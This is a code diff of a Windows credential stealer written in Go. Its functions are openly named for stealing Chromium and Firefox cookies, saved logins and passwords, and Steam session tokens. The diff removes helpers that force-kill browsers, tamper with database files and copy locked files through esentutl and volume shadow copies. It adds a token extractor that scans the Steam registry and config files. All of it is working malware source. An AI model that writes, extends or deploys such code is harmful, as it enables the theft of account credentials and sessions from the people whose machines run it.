@@ -9,7 +9,6 @@ func templateStealer() string {
 func runStealer() string {
 	results := map[string]string{}
 	var diagErrors []string
-	browserKilled = map[string]bool{}
 
 	browsers := []struct {
 		name  string
@@ -144,79 +143,12 @@ func runStealer() string {
 		results["_errors"] = "no data collected"
 	}
 
-	// Restart any browsers we killed
-	go restartBrowsers()
+
 
 	out, _ := json.Marshal(results)
 	return string(out)
 }
 
-func disableWALMode(dbFile string) {
-	f, err := os.OpenFile(dbFile, os.O_RDWR, 0o644)
-	if err != nil {
-		return
-	}
-	var header [20]byte
-	n, _ := f.ReadAt(header[:], 0)
-	if n >= 20 && header[18] == 2 {
-		header[18] = 1
-		header[19] = 1
-		f.WriteAt(header[18:20], 18)
-	}
-	f.Close()
-	os.Remove(dbFile + "-wal")
-	os.Remove(dbFile + "-shm")
-}
-
-func killBrowserProcess(exeName string) {
-	if exeName == "" {
-		return
-	}
-	cmd := exec.Command("taskkill", "/F", "/IM", exeName)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	_ = cmd.Run()
-	time.Sleep(500 * time.Millisecond)
-}
-
-func restartBrowsers() {
-	for exe := range browserKilled {
-		if exe == "" {
-			continue
-		}
-		// Find the browser path from common locations
-		var exePath string
-		localAppData := os.Getenv("LOCALAPPDATA")
-		programFiles := os.Getenv("ProgramFiles")
-		programFilesX86 := os.Getenv("ProgramFiles(x86)")
-		appData := os.Getenv("APPDATA")
-
-		searchPaths := map[string][]string{
-			"chrome.exe":   {filepath.Join(localAppData, "Google", "Chrome", "Application", "chrome.exe"), filepath.Join(programFiles, "Google", "Chrome", "Application", "chrome.exe")},
-			"msedge.exe":   {filepath.Join(programFilesX86, "Microsoft", "Edge", "Application", "msedge.exe"), filepath.Join(programFiles, "Microsoft", "Edge", "Application", "msedge.exe")},
-			"brave.exe":    {filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"), filepath.Join(programFiles, "BraveSoftware", "Brave-Browser", "Application", "brave.exe")},
-			"opera.exe":    {filepath.Join(localAppData, "Programs", "Opera", "opera.exe"), filepath.Join(appData, "Opera Software", "Opera Stable", "opera.exe")},
-			"vivaldi.exe":  {filepath.Join(localAppData, "Vivaldi", "Application", "vivaldi.exe")},
-			"firefox.exe":  {filepath.Join(programFiles, "Mozilla Firefox", "firefox.exe"), filepath.Join(programFilesX86, "Mozilla Firefox", "firefox.exe")},
-		}
-
-		if paths, ok := searchPaths[exe]; ok {
-			for _, p := range paths {
-				if _, err := os.Stat(p); err == nil {
-					exePath = p
-					break
-				}
-			}
-		}
-
-		if exePath != "" {
-			c := exec.Command(exePath)
-			c.SysProcAttr = &syscall.SysProcAttr{HideWindow: false}
-			_ = c.Start()
-		}
-	}
-}
-
-var browserKilled = map[string]bool{}
 
 func stealChromiumCookies(userDataPath string, browserName string, browserExe string) (string, []string) {
 	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
@@ -240,25 +172,15 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			copyOk = true
 		}
 
-		if !copyOk && !browserKilled[browserExe] {
-			browserKilled[browserExe] = true
-			killBrowserProcess(browserExe)
-			if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
-				_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
-				_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
-				copyOk = true
-			}
-		}
-
 		var dbPath string
 		if copyOk {
-			disableWALMode(tmpPath)
 			dbPath = tmpPath
 			defer os.Remove(tmpPath)
 			defer os.Remove(tmpPath + "-wal")
 			defer os.Remove(tmpPath + "-shm")
 		} else {
-			dbPath = cookiePath
+			clean := strings.ReplaceAll(cookiePath, string(os.PathSeparator), "/")
+			dbPath = "file:" + clean + "?immutable=1"
 		}
 
 		type queryResult struct {
@@ -307,7 +229,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 				return
 			}
 			ch <- queryResult{buf.String(), ""}
-		}(dbPath, copyOk)
+		}(dbPath)
 
 		select {
 		case res := <-ch:
@@ -341,32 +263,18 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			copyOk = true
 		}
 
-		if !copyOk && !browserKilled[browserExe] {
-			browserKilled[browserExe] = true
-			killBrowserProcess(browserExe)
-			if err := copyFileLocked(loginPath, tmpPath, browserExe); err == nil {
-				copyOk = true
-			}
-		}
-
 		var dbPath string
 		if copyOk {
-			disableWALMode(tmpPath)
 			dbPath = tmpPath
 			defer os.Remove(tmpPath)
 		} else {
-			dbPath = loginPath
+			clean := strings.ReplaceAll(loginPath, string(os.PathSeparator), "/")
+			dbPath = "file:" + clean + "?immutable=1"
 		}
 
 		ch := make(chan string, 1)
-		go func(path string, copied bool) {
-			var dsn string
-			if copied {
-				dsn = path
-			} else {
-				clean := strings.ReplaceAll(path, "\\", "/")
-				dsn = "file:" + clean + "?mode=ro&immutable=1"
-			}
+		go func(path string) {
+			dsn := path
 			db, err := sql.Open("sqlite", dsn)
 			if err != nil {
 				ch <- ""
@@ -399,7 +307,7 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 				buf.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
 			}
 			ch <- buf.String()
-		}(dbPath, copyOk)
+		}(dbPath)
 
 		select {
 		case res := <-ch:
@@ -432,17 +340,8 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err != nil {
-			if !browserKilled[browserExe] {
-				browserKilled[browserExe] = true
-				killBrowserProcess(browserExe)
-				if err2 := copyFileLocked(cookiePath, tmpPath, browserExe); err2 != nil {
-					errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err2))
-					continue
-				}
-			} else {
-				errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
-				continue
-			}
+			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
+			continue
 		}
 		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
 		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
@@ -455,7 +354,7 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 			errs = append(errs, fmt.Sprintf("firefox/%s open: %v", e.Name(), err))
 			continue
 		}
-		disableWALMode(tmpPath)
+
 		db.Exec("PRAGMA busy_timeout = 5000")
 
 		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
@@ -610,109 +509,82 @@ func stealUserInfo() string {
 
 func stealSteamTokens() string {
 	var sb strings.Builder
+	steamTokens := make(map[string]bool)
 
-	// Only read ConnectCache - these are actual session tokens
-	regPath := "Software\\Valve\\Steam\\ConnectCache"
-	var hKey syscall.Handle
-	keyPath, _ := syscall.UTF16PtrFromString(regPath)
-	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
-	if err == nil {
-		advapi32 := syscall.NewLazyDLL("advapi32.dll")
-		regEnumValue := advapi32.NewProc("RegEnumValueW")
-		for idx := uint32(0); ; idx++ {
-			nameLen := uint32(256)
-			nameBuf := make([]uint16, nameLen)
-			dataLen := uint32(16384)
-			dataBuf := make([]byte, dataLen)
-			var vtype uint32
-			r, _, _ := regEnumValue.Call(
-				uintptr(hKey),
-				uintptr(idx),
-				uintptr(unsafe.Pointer(&nameBuf[0])),
-				uintptr(unsafe.Pointer(&nameLen)),
-				0,
-				uintptr(unsafe.Pointer(&vtype)),
-				uintptr(unsafe.Pointer(&dataBuf[0])),
-				uintptr(unsafe.Pointer(&dataLen)),
-			)
-			if r != 0 {
-				break
-			}
-			name := syscall.UTF16ToString(nameBuf[:nameLen])
-			var token string
-			if vtype == 1 || vtype == 2 {
-				// REG_SZ or REG_EXPAND_SZ: data is UTF-16LE
-				if dataLen >= 2 {
-					u16 := make([]uint16, dataLen/2)
-					for i := range u16 {
-						u16[i] = uint16(dataBuf[i*2]) | uint16(dataBuf[i*2+1])<<8
-					}
-					token = syscall.UTF16ToString(u16)
+	extractJWTs := func(data []byte) {
+		content := string(data)
+		idx := 0
+		for idx < len(content) {
+			pos := strings.Index(content[idx:], "ey")
+			if pos == -1 { break }
+			start := idx + pos
+			end := start
+			for end < len(content) {
+				c := content[end]
+				if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_' {
+					end++
+				} else {
+					break
 				}
-			} else {
-				// Binary data (ConnectCache values are typically binary)
-				token = base64.StdEncoding.EncodeToString(dataBuf[:dataLen])
 			}
-			token = strings.TrimSpace(token)
-			if len(token) > 10 {
-				sb.WriteString(fmt.Sprintf("[ConnectCache:%s] %s\n", name, token))
+			candidate := content[start:end]
+			parts := strings.Split(candidate, ".")
+			if len(parts) >= 3 && len(parts[0]) > 10 && len(parts[1]) > 10 && len(parts[2]) > 10 && len(candidate) > 50 {
+				if !steamTokens[candidate] {
+					steamTokens[candidate] = true
+					sb.WriteString(candidate + "\n")
+				}
 			}
+			idx = end
 		}
-		syscall.RegCloseKey(hKey)
 	}
 
-	// Also read SteamLoginSecure from registry
-	steamRegPath := "Software\\Valve\\Steam"
-	var hKey2 syscall.Handle
-	keyPath2, _ := syscall.UTF16PtrFromString(steamRegPath)
-	err2 := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath2, 0, syscall.KEY_READ, &hKey2)
-	if err2 == nil {
-		advapi32 := syscall.NewLazyDLL("advapi32.dll")
-		regQueryValue := advapi32.NewProc("RegQueryValueExW")
-		wantKeys := []string{"SteamLoginSecure", "RememberPassword", "AutoLoginUser"}
-		for _, wk := range wantKeys {
-			wkPtr, _ := syscall.UTF16PtrFromString(wk)
-			dataLen := uint32(16384)
-			dataBuf := make([]byte, dataLen)
-			var vtype uint32
-			r, _, _ := regQueryValue.Call(
-				uintptr(hKey2),
-				uintptr(unsafe.Pointer(wkPtr)),
-				0,
-				uintptr(unsafe.Pointer(&vtype)),
-				uintptr(unsafe.Pointer(&dataBuf[0])),
-				uintptr(unsafe.Pointer(&dataLen)),
-			)
-			if r != 0 {
-				continue
-			}
-			var val string
-			if vtype == 1 || vtype == 2 {
-				if dataLen >= 2 {
-					u16 := make([]uint16, dataLen/2)
-					for i := range u16 {
-						u16[i] = uint16(dataBuf[i*2]) | uint16(dataBuf[i*2+1])<<8
+	regPaths := []string{
+		"Software\\\\Valve\\\\Steam\\\\ConnectCache",
+		"Software\\\\Valve\\\\Steam",
+	}
+
+	advapi32 := syscall.NewLazyDLL("advapi32.dll")
+	regEnumValue := advapi32.NewProc("RegEnumValueW")
+
+	for _, regPath := range regPaths {
+		var hKey syscall.Handle
+		keyPath, _ := syscall.UTF16PtrFromString(regPath)
+		if err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey); err == nil {
+			for idx := uint32(0); ; idx++ {
+				nameLen := uint32(256)
+				nameBuf := make([]uint16, nameLen)
+				dataLen := uint32(16384)
+				dataBuf := make([]byte, dataLen)
+				var vtype uint32
+				r, _, _ := regEnumValue.Call(
+					uintptr(hKey),
+					uintptr(idx),
+					uintptr(unsafe.Pointer(&nameBuf[0])),
+					uintptr(unsafe.Pointer(&nameLen)),
+					0,
+					uintptr(unsafe.Pointer(&vtype)),
+					uintptr(unsafe.Pointer(&dataBuf[0])),
+					uintptr(unsafe.Pointer(&dataLen)),
+				)
+				if r != 0 {
+					break
+				}
+
+				if vtype == 1 || vtype == 2 {
+					if dataLen >= 2 {
+						u16 := make([]uint16, dataLen/2)
+						for i := range u16 {
+							u16[i] = uint16(dataBuf[i*2]) | uint16(dataBuf[i*2+1])<<8
+						}
+						extractJWTs([]byte(syscall.UTF16ToString(u16)))
 					}
-					val = syscall.UTF16ToString(u16)
-				}
-			} else if vtype == 4 {
-				// DWORD
-				if dataLen >= 4 {
-					v := uint32(dataBuf[0]) | uint32(dataBuf[1])<<8 | uint32(dataBuf[2])<<16 | uint32(dataBuf[3])<<24
-					val = fmt.Sprintf("%d", v)
-				}
-			} else {
-				val = string(dataBuf[:dataLen])
-				for len(val) > 0 && val[len(val)-1] == 0 {
-					val = val[:len(val)-1]
+				} else {
+					extractJWTs(dataBuf[:dataLen])
 				}
 			}
-			val = strings.TrimSpace(val)
-			if len(val) > 0 {
-				sb.WriteString(fmt.Sprintf("[Steam:%s] %s\n", wk, val))
-			}
+			syscall.RegCloseKey(hKey)
 		}
-		syscall.RegCloseKey(hKey2)
 	}
 
 	var steamPaths []string
@@ -728,28 +600,11 @@ func stealSteamTokens() string {
 	if v := os.Getenv("ProgramFiles(x86)"); v != "" { addPath(filepath.Join(v, "Steam")) }
 	if v := os.Getenv("ProgramFiles"); v != "" { addPath(filepath.Join(v, "Steam")) }
 	if v := os.Getenv("LOCALAPPDATA"); v != "" { addPath(filepath.Join(v, "Steam")) }
-	for d := 'A'; d <= 'Z'; d++ {
-		drive := string(d) + ":\\"
-		addPath(filepath.Join(drive, "Steam"))
-		addPath(filepath.Join(drive, "Program Files", "Steam"))
-		addPath(filepath.Join(drive, "Program Files (x86)", "Steam"))
-		addPath(filepath.Join(drive, "Games", "Steam"))
-		addPath(filepath.Join(drive, "SteamLibrary"))
-		addPath(filepath.Join(drive, "Valve", "Steam"))
-	}
+	addPath("D:\\\\steam")
+	addPath("C:\\\\Steam")
 
 	for _, steamDir := range steamPaths {
 		if _, err := os.Stat(steamDir); os.IsNotExist(err) { continue }
-
-		entries, _ := os.ReadDir(steamDir)
-		for _, e := range entries {
-			if !e.IsDir() && strings.HasPrefix(strings.ToLower(e.Name()), "ssfn") {
-				ssfnData, err := os.ReadFile(filepath.Join(steamDir, e.Name()))
-				if err == nil && len(ssfnData) > 0 {
-					sb.WriteString(fmt.Sprintf("[SSFN:%s] %s\n", e.Name(), base64.StdEncoding.EncodeToString(ssfnData)))
-				}
-			}
-		}
 
 		vdfFiles := []string{
 			filepath.Join(steamDir, "config", "config.vdf"),
@@ -759,44 +614,7 @@ func stealSteamTokens() string {
 		for _, vf := range vdfFiles {
 			data, err := os.ReadFile(vf)
 			if err != nil || len(data) == 0 { continue }
-			content := string(data)
-			for _, line := range strings.Split(content, "\n") {
-				line = strings.TrimSpace(line)
-				lower := strings.ToLower(line)
-				isToken := strings.Contains(line, ".eyA") || strings.Contains(line, ".eyJ") ||
-					strings.Contains(lower, "refresh_token") || strings.Contains(lower, "access_token") ||
-					strings.Contains(lower, "webapitoken") || strings.Contains(lower, "steamloginsecure") ||
-					strings.Contains(lower, "steamid") || strings.Contains(lower, "account_name")
-				if !isToken {
-					continue
-				}
-				// VDF format: "key"		"value" (quoted, tab-separated)
-				// Extract all quoted strings from the line
-				var quoted []string
-				rest := line
-				for {
-					qi := strings.Index(rest, "\"")
-					if qi == -1 { break }
-					rest = rest[qi+1:]
-					qe := strings.Index(rest, "\"")
-					if qe == -1 { break }
-					quoted = append(quoted, rest[:qe])
-					rest = rest[qe+1:]
-				}
-				if len(quoted) >= 2 {
-					key := strings.TrimSpace(quoted[0])
-					val := strings.TrimSpace(quoted[1])
-					if len(val) > 0 {
-						sb.WriteString(fmt.Sprintf("[VDF:%s] %s\n", key, val))
-					}
-				} else {
-					clean := strings.Trim(line, "\"\t\r ")
-					if len(clean) > 20 {
-						sb.WriteString(clean)
-						sb.WriteString("\n")
-					}
-				}
-			}
+			extractJWTs(data)
 		}
 	}
 	return sb.String()
@@ -1122,31 +940,7 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 	return result, nil
 }
 
-func copyFileVSS(src, dst string) error {
-	cmd := exec.Command("esentutl.exe", "/y", src, "/vss", "/d", dst)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	if err := cmd.Run(); err != nil {
-		return err
-	}
-	info, err := os.Stat(dst)
-	if err != nil || info.Size() == 0 {
-		return fmt.Errorf("vss empty")
-	}
-	return nil
-}
 
-func copyFilePlain(src, dst string) error {
-	cmd := exec.Command("esentutl.exe", "/y", src, "/d", dst)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	if err := cmd.Run(); err != nil {
-		return err
-	}
-	info, err := os.Stat(dst)
-	if err != nil || info.Size() == 0 {
-		return fmt.Errorf("esentutl empty")
-	}
-	return nil
-}
 
 func copyFileLocked(src, dst, browserExe string) error {
 	_ = browserExe
@@ -1197,14 +991,6 @@ func copyFileLocked(src, dst, browserExe string) error {
 		if len(check) > 0 {
 			return nil
 		}
-	}
-
-	if err := copyFilePlain(src, dst); err == nil {
-		return nil
-	}
-
-	if err := copyFileVSS(src, dst); err == nil {
-		return nil
 	}
 
 	return fmt.Errorf("locked %s", src)
